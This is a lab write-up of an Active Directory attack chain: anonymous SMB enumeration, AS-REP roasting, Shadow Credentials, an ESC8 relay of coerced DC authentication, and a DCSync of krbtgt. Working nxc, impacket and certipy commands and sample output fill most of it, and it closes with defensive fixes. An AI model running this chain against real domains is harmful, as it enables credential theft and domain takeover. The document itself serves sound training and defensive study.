$ cat shadowgate.md

Hack Smarter · Easy · Active Directory

Black-box internal AD — one IP, no credentials, VPN only. The chain runs entirely through misconfiguration, not exploits: anonymous SMB leaks the user list -> one account has Kerberos pre-auth disabled, so AS-REP roast it and crack offline -> that user holds GenericWrite over a second user who sits in ADCS-Reader -> abuse the write with a Shadow Credentials attack to steal the second user's hash -> as that user, enumerate AD CS and find ESC8 (web enrollment over HTTP) -> relay a coerced DC machine authentication to the enrollment endpoint and mint a certificate as the domain controller -> PKINIT to the DC's hash -> DCSync the krbtgt. Unauthenticated to domain admin in eight moves.

Run on Parrot with current tooling, so the commands differ from the older writeups in three ways worth flagging: impacket ships as impacket-* binaries, not *.py; rustscan isn't installed (plain nmap is fine); and Certipy v5 changed several flags. I've noted each where it bites. Credential values are redacted; the method is intact.

$ recon

No rustscan on the box, so straight to nmap. The service list is a textbook domain controller — Kerberos, LDAP/GC, ADWS — with the tell that matters for later: SMB signing enabled but not required, which is what keeps the ESC8 relay alive at the end. 

nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 $DC
# 88/tcp   kerberos-sec
# 389/636  ldap / ldaps    Domain: shadow.gate
# 445      microsoft-ds    (signing: enabled, NOT required)
# 5985     winrm
# Host: DC01   DNS_Domain_Name: shadow.gate

$ anonymous smb

A null session authenticates, and the DC hands its user list to an unauthenticated caller — the first misconfiguration, and the seed for everything downstream: 

nxc smb $DC -u '' -p ''             # [+] shadow.gate\: (null session OK)
nxc smb $DC -u '' -p '' --users
# Administrator, krbtgt, ATHENA, mbrownlee, bbrown,
# jtrueblood, jsmith, clocke, tclarke, jbradford, amoss

$ AS-REP roasting

With a user list, spray for accounts that have Kerberos pre-authentication disabled — those hand back an AS-REP blob encrypted with the account's password hash, no credentials required. One account is vulnerable: 

impacket-GetNPUsers -usersfile users.txt -request -format hashcat \
  -outputfile asrep.txt -dc-ip $DC 'shadow.gate/'
# [-] ...doesn't have UF_DONT_REQUIRE_PREAUTH set     (x10)
# $krb5asrep$23$jtrueblood@SHADOW.GATE:...             <- the one

hashcat -a0 -m18200 asrep.txt rockyou.txt
# jtrueblood : <REDACTED>
On Parrot, impacket is installed as impacket-GetNPUsers, impacket-secretsdump, and so on — the .py names from most writeups won't resolve. Mode 18200 is AS-REP etype 23; 13100 would be Kerberoast (TGS-REP).

$ the edge — GenericWrite + ADCS-Reader

Collect the graph as jtrueblood. The interesting outbound control: jtrueblood has GenericWrite over bbrown, and bbrown is a member of ADCS-Reader. That second fact is why bbrown is worth becoming — the group name points straight at the certificate services, where the escalation lives. Confirmed from LDAP without touching the GUI: 

nxc ldap $DC -u jtrueblood -p "$JT_PASS" \
  --query "(sAMAccountName=bbrown)" "memberOf"
# memberOf: CN=ADCS-Reader,CN=Users,DC=shadow,DC=gate

$ becoming bbrown — Shadow Credentials

GenericWrite lets you write a target's msDS-KeyCredentialLink attribute. Drop a key pair in there, authenticate as them via PKINIT, pull their NT hash, and restore the attribute — a clean account takeover with nothing to crack and no lasting trace. Certipy automates the whole dance: 

certipy shadow auto -u 'jtrueblood@shadow.gate' -p "$JT_PASS" \
  -account bbrown -dc-ip $DC
# [*] Adding Key Credential to msDS-KeyCredentialLink for bbrown
# [*] Got TGT ... Restoring the old Key Credentials
# [*] NT hash for 'bbrown': <REDACTED>

$ ESC8 — the misconfiguration

As bbrown, enumerate AD CS. The finding is ESC8, and it's flagged on the CA itself, not on a template — this is the part people get wrong. ESC8 is a relay bug: the CA runs an HTTP web-enrollment endpoint that accepts NTLM, and request disposition is set to Issue. Nothing is wrong with any template; the vulnerability is that you can relay someone else's NTLM authentication to that endpoint and enroll a certificate on their behalf. 

certipy find -u 'bbrown@shadow.gate' -hashes ":$BB_HASH" \
  -dc-ip $DC -stdout -enabled
# Certificate Authorities -> shadow-DC01-CA
#   Web Enrollment: HTTP Enabled : True
#   Request Disposition : Issue
#   [!] Vulnerabilities
#       ESC8 : Web Enrollment is enabled over HTTP
Certipy v5 removed the -vulnerable flag — find now assesses vulnerabilities by default and you narrow the output with -enabled. Older writeups all use -vulnerable and it will error on v5. Pass an NT hash as -hashes ":<nt>" (empty LM half).

$ the relay — coercing DC01

ESC8 is a two-terminal move. Stand up a relay pointed at the enrollment endpoint, requesting a certificate on the DomainController template. Then coerce DC01 into authenticating to you — its machine-account auth gets relayed to the CA, and a certificate is issued for the DC. 

# terminal 1 - the relay (needs root to bind 445)
sudo $(which certipy) relay -target 'http://DC01.shadow.gate' \
  -template DomainController -ca shadow-DC01-CA

# terminal 2 - coerce the DC back to our listener
nxc smb $DC -u bbrown -H "$BB_HASH" -M coerce_plus -o LISTENER=$ATTACKER

The relay catches the coerced auth and writes the DC's identity to disk: 

# (terminal 1)
# (SMB): Authenticating connection from DC01 ... SUCCEED
# Certificate issued with request ID 3
# Got certificate with DNS Host Name 'DC01.shadow.gate'
# Saving certificate and private key to 'dc01.pfx'
Two Parrot / v5 snags here. Certipy's relay binds a raw SMB listener on port 445, so it needs sudo — run it unprivileged and you get Permission denied. And petitpotam.py isn't installed; NetExec's coerce_plus module bundles PetitPotam / DFSCoerce / PrinterBug and fires the same MS-EFSRPC coercion. Make sure nothing (a stray smbd) is already squatting on 445, or the relay can't catch the auth.

$ domain compromise — PKINIT + DCSync

Authenticate to Kerberos with the DC's certificate via PKINIT — that yields a TGT and the machine account's NT hash. A domain-controller account holds replication rights, so with its hash you can DCSync: ask the DC to replicate secrets as if you were another DC, and pull krbtgt. 

certipy auth -pfx dc01.pfx -dc-ip $DC
# Got hash for 'dc01$@shadow.gate': ...:<REDACTED>

impacket-secretsdump 'shadow.gate/DC01$@DC01.shadow.gate' \
  -hashes ":$DC_HASH" -just-dc-user krbtgt
# krbtgt:502:...:<REDACTED>:::

$ flag

krbtgt NT hash : <REDACTED>

Owning krbtgt is the endgame: it's the key that signs every Kerberos ticket in the domain, so it lets you forge Golden Tickets for any principal, indefinitely. Full compromise.

$ takeaway

  • There was no single bug — there was a chain of small defaults. Anonymous user enumeration, one account with pre-auth off, one loose ACL, one CA doing HTTP enrollment. Each is individually survivable; stacked, they're a straight line from unauthenticated to domain admin.
  • ESC8 is an endpoint problem, not a template problem. The fix isn't hardening a certificate template — it's disabling HTTP web enrollment, enforcing HTTPS with channel binding (EPA), and turning on SMB signing everywhere so coerced auth can't be relayed in the first place.
  • GenericWrite is account takeover. Shadow Credentials turns a single writable attribute into someone else's hash with no cracking and no password reset. Audit msDS-KeyCredentialLink write permissions the way you'd audit who can reset passwords.
  • Kerberos pre-auth should never be disabled. One DONT_REQ_PREAUTH account handed over the entire foothold, offline and unauthenticated.
